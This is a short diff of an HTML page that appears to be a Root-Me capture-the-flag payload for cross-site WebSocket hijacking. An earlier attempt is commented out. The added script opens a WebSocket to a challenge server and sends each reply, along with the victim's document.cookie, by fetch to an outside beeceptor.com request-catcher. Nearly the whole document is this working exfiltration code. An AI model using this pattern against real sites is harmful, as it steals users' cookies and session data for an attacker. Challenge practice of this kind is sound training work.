@@ -1,14 +1,26 @@
 <h1>Hello</h1>
+#<script>
+  #var ws = new WebSocket('ws://ctf30.root-me.org/ws');
+  #ws.onopen = function() {
+    #ws.send("hello");
+    #ws.send("Get the flag");
+  #};
+  #ws.onmessage = function(event) {
+    #fetch('https://rootme.free.beeceptor.com/', {method: 'POST', mode: 'cors', body: event.data});
+  #};
+  @ws.onerror = function(event) {
+    #fetch('https://rootme.free.beeceptor.com/', {method: 'POST', mode: 'cors', body: event.data});
+  #};
+#</script>
 <script>
-  var ws = new WebSocket('ws://ctf30.root-me.org/ws');
-  ws.onopen = function() {
-    ws.send("hello");
-    ws.send("Get the flag");
-  };
-  ws.onmessage = function(event) {
-    fetch('https://rootme.free.beeceptor.com/', {method: 'POST', mode: 'cors', body: event.data});
-  };
-  ws.onerror = function(event) {
-    fetch('https://rootme.free.beeceptor.com/', {method: 'POST', mode: 'cors', body: event.data});
-  };
+  websocket = new WebSocket('ws://ctf11.root-me.org/ws');
+  websocket.onopen = start;
+  websocket.onmessage = handleReply;
+  
+  function start(event) {  
+    websocket.send("READY");
+  }
+  function handleReply(event) {  
+    fetch('https://rootme.free.beeceptor.com/'+event.data+document.cookie, {mode: 'no-cors'})
+  }
 </script>
